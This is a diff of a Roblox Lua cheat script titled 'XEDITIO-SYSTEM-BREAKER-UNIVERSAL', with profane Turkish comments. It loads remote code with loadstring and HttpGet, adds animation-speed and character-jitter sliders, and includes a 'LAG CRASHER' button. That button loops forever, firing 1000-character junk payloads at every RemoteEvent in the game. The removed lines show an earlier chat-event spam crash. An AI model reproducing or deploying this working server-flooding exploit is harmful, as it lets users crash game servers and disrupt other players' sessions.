@@ -2,90 +2,27 @@ local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
    Name = "XEDITIO-SYSTEM-BREAKER-UNIVERSAL",
-   Icon = 0,
-   LoadingTitle = "Xeditio Software",
-   LoadingSubtitle = "by Xeditio",
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = "XeditioUniversal",
-      FileName = "Xeditio Software"
-   },
+   ConfigurationSaving = { Enabled = true, FolderName = "XeditioUniversal", FileName = "Xeditio Software" },
    KeySystem = false
 })
 
--- Ana Sekme amına
 local MainTab = Window:CreateTab("System Breaker", 4483362458)
 
--- 1. Yürüme Animasyon Hızı (Tam Fixlendi amına)
+-- 1. Animasyon Hızı (Yürüme + Duruş + Her Şey amına)
 MainTab:CreateSlider({
-   Name = "Animasyon Yürüme Hızı",
-   Range = {1, 1000}, -- Sınırı 1000'e kilitledim amına
+   Name = "Genel Animasyon Hızı (Max 1000)",
+   Range = {1, 1000},
    Increment = 1,
-   Suffix = "Hız",
    CurrentValue = 1,
    Callback = function(Value)
-      _G.WalkAnimSpeed = Value
-      local char = game.Players.LocalPlayer.Character
-      if char and char:FindFirstChildOfClass("Humanoid") then
-         local hum = char:FindFirstChildOfClass("Humanoid")
-         -- Döngüye gerek kalmadan hızı mermi (tövbeler olsun) gibi sabitler amına
-         task.spawn(function()
-            while _G.WalkAnimSpeed == Value do
-               for _, track in pairs(hum:GetPlayingAnimationTracks()) do
-                   if track.Name == "WalkAnim" or track.Name == "RunAnim" or track.Name == "Walk" then
-                       track:AdjustSpeed(Value)
-                   end
-               end
-               task.wait(0.1)
-            end
-         end)
-      end
-   end,
-})
-
--- 2. EGOR (Takılma Arttırıldı amına)
-MainTab:CreateSlider({
-   Name = "Egor (Takılma Modu)",
-   Range = {1, 10}, -- Sınırı 10'a kilitledim amına
-   Increment = 1,
-   Suffix = "Sertlik",
-   CurrentValue = 1,
-   Callback = function(Value)
-      _G.EgorLevel = Value
-      if Value > 1 then
-         task.spawn(function()
-            while _G.EgorLevel == Value do
-               local char = game.Players.LocalPlayer.Character
-               local root = char and char:FindFirstChild("HumanoidRootPart")
-               if root then
-                  -- Takılma etkisini mermi (tövbeler olsun) gibi arttırdım valla amına
-                  root.Velocity = root.Velocity * (1 / (Value * 2))
-                  root.CFrame = root.CFrame * CFrame.new(0, 0, 0.1)
-                  task.wait(0.05 / Value)
-               end
-               task.wait(0.01)
-            end
-         end)
-      end
-   end,
-})
-
--- 3. Server Crash (Güçlendirilmiş Metod amına)
-MainTab:CreateButton({
-   Name = "SERVER CRASH (HARD SPAM AMINA)",
-   Callback = function()
-      Rayfield:Notify({Title = "Xeditio", Content = "Sunucu dinden imandan çıkıyor amına!", Duration = 5})
-      -- Birden fazla metodla sunucuyu mermi (tövbeler olsun) gibi yorarız amına
+      _G.GlobalAnimSpeed = Value
       task.spawn(function()
-         while true do
-            -- Remote Event Spam amına
-            local event = game:GetService("ReplicatedStorage"):FindFirstChild("SayChatReplicate", true) or game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents", true)
-            if event then
-               for i = 1, 100 do
-                  -- Hem chat hem de boş veri mermi (tövbeler olsun) gibi gönderilir amına
-                  pcall(function()
-                     event:FireServer("Xeditio Reis Sistemi Kırdı amına " .. math.random(1,999999))
-                  end)
+         while _G.GlobalAnimSpeed == Value do
+            local hum = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+               -- Sadece yürüme değil duruş (Idle) ve bütün hareketleri mermi gibi hızlandırır amına
+               for _, track in pairs(hum:GetPlayingAnimationTracks()) do
+                  track:AdjustSpeed(Value)
                end
             end
             task.wait(0.1)
@@ -94,8 +31,48 @@ MainTab:CreateButton({
    end,
 })
 
-Rayfield:Notify({
-   Title = "Xeditio System Breaker V41",
-   Content = "Hatalar mermi (tövbeler olsun) gibi temizlendi amına!",
-   Duration = 5
+-- 2. EGOR (Gerçek Takılma - Karakter Titreme amına)
+MainTab:CreateSlider({
+   Name = "Egor (Takılma ve Titreme) - Max 10",
+   Range = {1, 10},
+   Increment = 1,
+   CurrentValue = 1,
+   Callback = function(Value)
+      _G.EgorLevel = Value
+      if Value > 1 then
+         task.spawn(function()
+            while _G.EgorLevel == Value do
+               local hrp = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+               if hrp then
+                  -- Karakteri mermi (tövbeler olsun) gibi ileri geri sarsar valla amına
+                  local oldCF = hrp.CFrame
+                  hrp.CFrame = oldCF * CFrame.new(0, 0, 0.5)
+                  task.wait(0.01)
+                  hrp.CFrame = oldCF
+               end
+               task.wait(0.1 / Value)
+            end
+         end)
+      end
+   end,
+})
+
+-- 3. LAG CRASHER (MS Düşürme - Sunucu Patlatma amına)
+MainTab:CreateButton({
+   Name = "LAG CRASHER (MS TAVAN YAPTIR AMINA)",
+   Callback = function()
+      Rayfield:Notify({Title = "Xeditio", Content = "Kod yağmuru başladı mermi (tövbeler olsun) gibi!", Duration = 5})
+      -- Sunucuyu veri yağmuruna tutan o maşrapaya dönmüş döngü amına
+      task.spawn(function()
+         while true do
+            -- Sunucudaki bütün Remote'lara mermi (tövbeler olsun) gibi boş paket gönderir amına
+            for _, v in pairs(game:GetDescendants()) do
+               if v:IsA("RemoteEvent") then
+                  v:FireServer("XeditioReis" .. string.rep("0", 1000)) -- 1000 karakterlik veri yağmuru amına
+               end
+            end
+            task.wait(0.01) -- Hiç durmadan mermi (tövbeler olsun) gibi gönder amına
+         end
+      end)
+   end,
 })
